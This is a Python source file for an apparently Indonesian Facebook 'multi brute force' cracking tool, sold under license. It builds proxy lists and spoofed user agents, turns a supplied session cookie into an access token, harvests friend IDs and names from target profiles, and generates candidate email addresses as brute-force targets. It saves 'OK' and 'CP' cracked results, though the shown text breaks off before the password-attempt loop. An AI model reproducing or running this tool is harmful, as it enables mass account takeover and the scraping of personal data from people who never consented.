#----------[ IMPORT-MODULE ]----------#
import os
import re
import json
import sys
import random
import time
import datetime
import requests

try:
	import bs4
	import rich
	import requests
	import stdiomask
except:
	os.system("pip install bs4")
	os.system("pip install rich")
	os.system("pip install requests")
	os.system("pip install stdiomask")

#----------[ IMPORT-RICH ]----------#	
from bs4 import BeautifulSoup as sop	
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.tree import Tree
from rich import print as prints
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.panel import Panel as panel

#----------[ GLOBAL-NAME ]----------#
id, id2, uid = [],[],[]
tokene, akune = [],[]
sandine, sandina = [],[]
method, ugen, ugen2 = [],[],[]
loop, ok, cp = 0,0,0
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mKontolodon')
prox=open('.prox.txt','r').read().splitlines()
#----------[ USER-CRACK ]----------#  
for x in range(1000):
  rr = random.randint
  rc = random.choice
  androversi = random.choice(["15_4","14_3","13_5","14_5","13_4"])
  asep1 = random.choice(["Y6MLQN","8G7LN3","2783VM","X35XFL","W5T30Y"])
  asep4 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {androversi} like Mac OS X) AppleWebKit/{str(rr(500,800))}.{str(rr(2,50))} (KHTML, like Gecko) Version/{str(rr(10,20))}.{str(rr(4,80))} Mobile/{asep1} Safari/{str(rr(500,800))}.{str(rr(2,30))}"
  asep5 = f"viabrowser;Safary-Mozilla/5.0 (iPhone; CPU iPhone OS {androversi} like Mac OS X) AppleWebKit/{str(rr(500,800))}.{str(rr(2,50))} (KHTML, like Gecko) Version/{str(rr(10,20))}.{str(rr(4,80))} Mobile/{asep1} Safari/{str(rr(500,800))}.{str(rr(2,30))}"
  raii = rc([asep4, asep5])
  ugen.append(raii)

for x in range(1000):
    rr = random.randint
    rc = random.choice
    androversi = random.choice(["11_0","10_3","9_0","10_0","9_2"])
    asep1 = random.choice(["Y6MLQN","8G7LN3","2783VM","X35XFL","W5T30Y"])
    asep = f"Mozilla/5.0 (Redmi; CPU Redmi OS {androversi} like Android) AppleWebKit/{str(rr(500,800))}.{str(rr(2,50))} (KHTML, like Gecko) Version/{str(rr(10,20))}.{str(rr(4,80))} Mobile/{asep1} Safari/{str(rr(500,800))}.{str(rr(2,30))}"
    asepp = f"viabrowser;Redmi-Mozilla/5.0 (Redmi; CPU Redmi OS {androversi} like Android) AppleWebKit/{str(rr(500,800))}.{str(rr(2,50))} (KHTML, like Gecko) Version/{str(rr(10,20))}.{str(rr(4,80))} Mobile/{asep1} Safari/{str(rr(500,800))}.{str(rr(2,30))}"
    rai = rc([asep, asepp])
    ugen.append(rai)

#--------[ GENERATE-USER-AGENT ]----------#
for generate in range(10):
	a=random.randrange(1, 9)
	b=random.randrange(1, 9)
	c=random.randrange(7, 13)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}.{b}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen2.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
ugen = random.choice(["Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 10; SM-A700S Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Oneplus A99831 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.03.54;]","Mozilla/5.0 (Linux; Android 11; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; 22041219I Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.02.33;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]"])
ugen = random.choice(["Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Redmi 9 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.03.54;]","Mozilla/5.0 (Linux; Android 11; Redmi K40 Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.02.33;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Redmi K40 Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; Redmi Note 8 Pro Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]"])
	
for x in range(1000):
	rr = random.randint
	redmi = f"Mozilla/5.0 (Linux; Android {str(rr(9,10))}; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(0,200))}.0.{str(rr(500,4000))}.{str(rr(0,200))} Mobile SFB/{str(rr(0,150))}.0.{str(rr(0,5000))}.{str(rr(0,200))} Mobile Safari/537.36"
	ugen = (redmi)
   
#--------[ TAHUN-AKUN ]--------#    
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
	
def clear():
    os.system('clear')
###----------[ PEWARNA ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m' 
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'  # DEFAULT
m = '\x1b[1;91m'  # RED +
k = '\033[93m'  # KUNING +
h = '\x1b[1;92m'  # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'  # UNGU
kk = '\033[33m'  # KUNING -
b = '\33[1;96m'  # BIRU -
p = '\x1b[0;34m'  # BIRU +
# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
A = "\x1b[38;5;248m"
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
asu = random.choice([m, k, h, u, b])
# ------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
			
#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
ses=requests.Session()
#----------[ HAPUS ]----------#		
def ganti_cokies():
      try:os.remove(".cyxieoncokies.txt")
      except:pass
      try:os.remove(".cyxieontoken.txt")
      except:pass
      login()
#----------[ HAPUS-LISENSI ]----------#		
def ganti_lisensi():
      try:os.remove("saved_license.txt")
      except:pass
      exit()
      	
#----------[ BANNER ]----------#
def banner():
      if "win" in sys.platform:os.system("cls")
      else:os.system("clear")
      print(f'''{biru}\t ____        ______                      __   
      \t / __ \__  __/ / __ \___  _________  ____/ /__  _____
     \t/ /_/ / / / / / /_/ / _ \/ ___/ __ \/ __  / _ \/ ___/
  \t/ _, _/ /_/ / / _, _/  __/ /__/ /_/ / /_/ /  __/ /    
\t/_/ |_|\__,_/_/_/ |_|\___/\___/\____/\__,_/\___/_/{xxx}\n
\t\t• {m}Multi Brute Force Facebook{xxx} •
\t\t    {u}author by {K}RulRecoder\n''')
def awal():
	banner()
	prints(panel(f"""{P}[01] Login With Lisensi\n{P}[02] Hubungi Admin\n{P}[{M}00{P}] Exit Licensi """,width=43,title=f"[[green] LOG IN [/]]",style=f"bold blue"))
	cukuf = input(f"{biru}└──[{puti} Input : {H}")
	if cukuf in ["1","01"]:
		run()
	elif cukuf in ["2","02"]:
		print("")
		print(f"{biru}└──[{P}sedang diarahkan ke whastapp author")
		os.system('xdg-open https://wa.me/+6281283547452?text=bang+minta+lisensi+sc+ini!!')
		input(f" {P}[{biru}•{P}] Enter")
		awal()
	elif cukuf in ["0","00"]:
		print("")
		print(f"{biru}└──[{mer}sedang menghapus lisensi......!!!")
		time.sleep(2)
		ganti_lisensi()
	else:
		print("")
		jalan(f"{m} isi yang benar!! ")
		awal()
#----------------------[ LICENSE ]---------------------#
import requests
from datetime import datetime

LICENSE_FILE_PATH = "saved_license.txt"

def is_license_valid(license_info):
    # Split license_info into components
    license_key, start_time_str, end_time_str = license_info.split('|')

    # Convert string times to datetime objects
    start_time = datetime.strptime(start_time_str, '%Y-%m-%d %H:%M')
    end_time = datetime.strptime(end_time_str, '%Y-%m-%d %H:%M')

    # Get current time
    current_time = datetime.now()

    # Check if the license is within the valid time range
    return start_time <= current_time <= end_time

def check_license(license_key):
    # Jika lisensi sudah tersimpan, gunakan langsung tanpa memerlukan input
    try:
        with open(LICENSE_FILE_PATH, 'r') as file:
            saved_license = file.read()
            if saved_license and is_license_valid(saved_license):
                return True
    except FileNotFoundError:
        pass

    # Jika lisensi tidak tersimpan atau tidak valid, lakukan verifikasi ulang
    github_repo_url = "https://raw.githubusercontent.com/khoirulez/RR07/main/mylisensi.txt"
    try:
        response = requests.get(github_repo_url)
        licenses = response.text.split('\n')

        for license_info in licenses:
            if license_info.startswith(license_key) and is_license_valid(license_info):
                # Simpan lisensi yang valid ke penyimpanan lokal
                with open(LICENSE_FILE_PATH, 'w') as file:
                    file.write(license_info)
                return True

        return False

    except requests.RequestException as e:
        print(f"Error: {e}")
        return False
def get_expiration_date(license_info):
    _, _, end_time_str = license_info.split('|')
    end_time = datetime.strptime(end_time_str, '%Y-%m-%d %H:%M')
    return end_time
def file_read():
	try:Licen = open('.saved.license.txt','r').read()
	except:pass
def run():
    try:
        LICENSE_FILE_PATH = "saved_license.txt"
        with open(LICENSE_FILE_PATH, 'r') as file:
            saved_license = file.read()
            expiration_date = get_expiration_date(saved_license)
            print(f'  [•]{M} Sedang Mengecek Lisensi..... !!!! ');time.sleep(2)
            print(f"{H}Lisensi kadaluwarsa pada tanggal: {B}{expiration_date.strftime('%Y-%m-%d %H:%M')}");time.sleep(2)
            if saved_license and is_license_valid(saved_license):
                time.sleep(0.03)
                print(f"{H}Lisensi valid. Selamat menggunakan program.")
                time.sleep(1)
                os.system("clear")
                menu()
    except (IOError,FileNotFoundError):
       print("")
       license_key = input(f"[•]{U}Masukkan lisensi:{B} ")
       licen = open(".saved_license.txt", "w").write(license_key)
       time.sleep(0.03)

       if check_license(license_key):
          with open(LICENSE_FILE_PATH, 'r') as file:
              saved_license = file.read()
              expiration_date = get_expiration_date(saved_license)
              print(f'  [•]{M} Sedang Mengecek Lisensi..... !!!! ');time.sleep(2)
              print(f"{H}Lisensi kadaluwarsa pada tanggal: {B}{expiration_date.strftime('%Y-%m-%d %H:%M')}");time.sleep(2)
              if saved_license and is_license_valid(saved_license):
                  time.sleep(0.03)
                  print(f"{H}Lisensi valid. Selamat menggunakan program.")
                  time.sleep(2)
                  os.system("clear")
                  menu()
       else:
          os.system("rm -f .saved_license.txt")
          print(f"{m}Lisensi tidak valid atau telah kadaluarsa. Tolong masukan lisensi dengan benar.")
          time.sleep(0.03)
          run()
#kukis
def login():
	os.system('clear')
	banner()
	cok = input(f'[•]{u}Masukkan cookie :{h} ')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'> {m}cookie kamu invalid / ganti cookie lain !!!');time.sleep(2);exit()
		else:
			for x in find:
				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)',xz.text).group(1)
				open('.tok.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				print(f"{u}Token : {h}{took} ")
				menu()
	except Exception as e:exit(e)
  
#----------[ BAGIAN-MENU ]----------#            
def menu():
	banner()
	print(f'  [•]{M} Sedang Mengecek Cookies..... !!!! ');time.sleep(2)
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print(f'{m}cookies telah kadaluarsa bro')
		time.sleep(4)
		login()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		uidfb = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\n{P} [:] Tidak ada koneksi{P}")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".tok.txt")
		except:pass
		login()
	print(f"{h}cookie telah aktif")
	time.sleep(2)
	os.system('clear')
	banner()
	prints(panel(f"""[white][[cyan]•[white]] Name Tumbal [[green]{nama}[white]] \n[[cyan]•[white]] Idz Tumbal [white][[green]{uidfb}[white]]""",width=43,title=f"[[green] INFO TUMBAL [/]]",style=f"bold blue"))
	prints(panel(f"""[white][[cyan]01[white]] Crack Publik [[green]ON[white]] \n[[cyan]02[white]] Crack Massal [white][[red]OF[white]] \n[[cyan]03[white]] Crack Email [white][[green]ON[white]] \n[[cyan]04[white]] Crack File [white][[red]OF[white]] \n[[cyan]05[white]] Result CP [[green]ON[white]]\n[[cyan]06[white]] Result OK [white][[green]ON[white]]\n[[cyan]{mer}00[white]] logout [white][[red]hapus cookies[white]] [[green]ON[white]] """,width=43,title=f"[[green] MENU CRACK [/]]",style=f"bold blue"))
	print(f"{biru}╭────────────────────────────────────────────{puti}")
	CYXIEON_GANTENG = input(f'{biru}└──[{puti} Input menu : ')
	if CYXIEON_GANTENG in ['01','1']:
           print(f"\n{biru}╭────────────────────────────────────────────{puti}")
           idt = input('└──[ ID Target : ')
           dump(idt,"",{"cookie":cok},token)
           atur_id()
	if CYXIEON_GANTENG in ['02','2']:
	        dump_massal()
	elif CYXIEON_GANTENG in ['03','3']:
	        mail2()
	elif CYXIEON_GANTENG in ['04','4']:
	        Crack_file()
	elif CYXIEON_GANTENG in ['05','5']:
	        hasil_cp()
	elif CYXIEON_GANTENG in ['06','6']:
	        hasil_ok()
	elif CYXIEON_GANTENG in ['00','0']:
            ganti_cokies()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		print(f"\n{biru}╭────────────────────────────────────────────{puti}")
		jum = int(input('└──[ Mau Berapa Target Njing ? : '))
	except ValueError:
		print('>> Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('>> Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('└──[ Masukkan Idz Yang Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+token[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('>> Sinyal Loh Kek Kontoll ')
			exit()
	try:
		print(f'└──[ Total Idz Yang Terkumpul🔥{h}'+str(len(id)))
		atur_id()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> Sinyal Lo kek Kontol ')
		exit()
	except (KeyError,IOError):
		print(f'>>{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		exit()
#----------[ CRACK-MASSAL ]----------#      
def dumpp_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
	    print(f"\n{biru}╭────────────────────────────────────────────{puti}")
	    kumpulkan = int(input(f'└──[ Mau Berapa ID ? : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'{biru}└──[{puti} Masukin ID Yang Ke  '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookie':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      prints(f"{biru}└──[{puti} lagi mengumpulkan id, telah sukses mengumpulkan [green]{len(id)}[white] id")
	      atur_id()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()
#-----------------[ CRACK EMAIL ]-----------------#
def mail2():
	dump=[]
	rc = random.choice
	rr = random.randint
	tengah = ['mulyana','mulyono','ramdani','ramdan','ramadhan','ramadhani','saputra','syahputra','wijaya','kusuma','irawan','wirawan','setiawan','setyawan','hamdani','dermawan','sulaeman','pasundan','gumilang','gumilar','saepuloh','setiadi','rusmana','lesmana','suparman','hermansah','suherman','wijayanto','saripudin','saepudin','firmansyah','hidayat','kurnia','kurniawan','ramadani','muhamad','alamsyah','maulana','aprilia','apriliani','yulianti','julianti','sumiati','rahayu','saluyu','maharani','mulyani','rusmini','aisyah','fatimah','lestari','mulyati','damayanti','pertiwi','handayani','azizah','apipah','aropah','nuraisah','nurlaila','nursafitri','nurcahaya','nurjanah','nurfatimah','rahmawati','rosmawati','larasti','purnama','nurohman','nurahman','adinda','sumarni','sukaesih','bintang','kirana','cahyani','nurarsyila','amanda','sulastri','septiani','kartina','karlina','nuraropah','isabela','safitri','mawarni','rofikah','nengsih','ningsih','yuningsih','yunengsih','suningsih','sunengsih','malaka','azzahra','larasati','pertiwi','pratiwi','asyifa','aminah','nasution','sitorus','sinaga','sihombing','simamora','saepuloh','susanto','santoso','nursuci','khoerunisa','fitriani','sutomo','khan','singh','hartono','ruhyadi','ardiansyah','hardiansyah','herdiansyah','sinaga','prasti','kejora','rokayah','supriadi','willyam','wibowo','armada','darmawan','badriah','sulistia','fadilah','natalia','handayani','rusmiati','nurahma,nursakila,salsabila','hungkul','sayang','gaming','utama','pertama','peratama','pratama']
	belakang = ['777','999','111','222','333','444','638','656','556','452','281','812','235','898','998','110','739','892','344','87','665','81','sumarna','dermawan','darmawan','dirgantara','wijayanto','wijayanti','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','34','35','36','38','39','40','41','42','42','43','44','50','45','46','47','48','49','51','231','241','772','829','610','64','628','528','422','241','321','537','771','883','836','929','737','123','288','913','891','88','66','77','66','55','991','728','923','112','372','882','9238','194','883','809','293','251','726','332','231','829','980','8247','3738','2894','118','119','621','535','567','765','776','236','266','115','825','653','712','210','019','738','538','729','753','436','82','83','766','667','554','445','133','1933','1982','2000','200238','7279','2838','638','9293','789','009','402','452','455','566','655',',223','332','331','313','62','63','64','65','66','67','68','gaming','123','321','332','033','721','768','988','998','901','425','719','223','7789','0018','335','827','811','880','092','064','862','6672','82','91','21','23','31','45','54','677','882','98','890','728','112','221','236','221','621','722','112','829','xd','ramdani','ramadani','maulana','aisyah','773','663','724','252','332','173','809','713','739','221','114','116','117','752','82','56','64','001','002','003','004','005','006','009''102','628','791','991','88','667','66','78','173','992','32','007','07','08','09','01','02','03','04','05','06','66','99','723','820','61','231','geulis','032','610','889','883','812','72','77','101','official','gaming','utama','123','1234','12345','123456','cakep','90','96','25']
	tengah = ['widianti','yuliyanti','yulianto','supomo','sapitri','rancaekek','yuliana','aprianti','aprilianti','andini','hasanah','karimah','halimah','salamin','farida','adinda','kurniasih','sulistiawati','nurkarimah','nurazizah','daniati','geulis','cantik','imut','gemoy','kece','indrawan','rachmatika','sugiarti','sugih','ferdiansyah','nuraropah','sagita','nuralisa','setiawati','ramayanti','soraya','badriah','sutomo','supardi','supriadi','suparman','solehah','kasep']
	global ok , cc
	print(f"\n{biru}╭────────────────────────────────────────────{puti}")
	nama = input(f'└──[ nama target : ')
	if ',' in str(nama):
		print(f'  └──[ masukan nama, jangan kosong ')
		time.sleep(3);str(nama)
	doma = input(f'└──[ domain (ex:@gmail.com) : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		print(f'  └──[ masukkan domain dengan benar ')
		time.sleep(3);str(doma)
	jumlah = input(f'└──[ total dump (max:10000) : ')
	for xyz in range(int(jumlah)):
		AA = nama
		BB = [f'{str(rc(tengah))}',f'{str(rr(0,31))}',f'{str(rc(belakang))}']
		CC = doma
		DD = f'{AA}{str(rc(BB))}{CC}'
		if DD in id:pass
		else:id.append(DD+'|'+nama)
		if len(dump)==999999:passwordlist()
		sys.stdout.write(f"\r└──[ berhasil mengumpulkan {b}{len(id)} {P}email...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	atur_id()
###-----[ CRACK FILE ]-----###
def Crack_file():
	print(f"\n{biru}╭────────────────────────────────────────────{puti}")
	file = input(f"└──[ masukan nama folder/file : ")
	try:
		uid = open(file,"r").read().splitlines()
		for data in uid:
			try:user,nama = data.split('|')
			except:continue
			sys.stdout.write(f"\r└──[ sedang mengumpulkan id, sukses mengumpulkan {B}{len(id)}{P} id...."),
			sys.stdout.flush()
			id.append(data)
	except FileNotFoundError:exit(f"└──[ file tidak ada")
	atur_id()
#----------[ CRACK-PUBLIK  ]----------#            
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r{biru}└──[{puti} sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
	      

#----------[ HASIL-OK ]----------#            
def hasil_ok():
	try:vin = os.listdir('CYXIEON-OK')
	except FileNotFoundError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
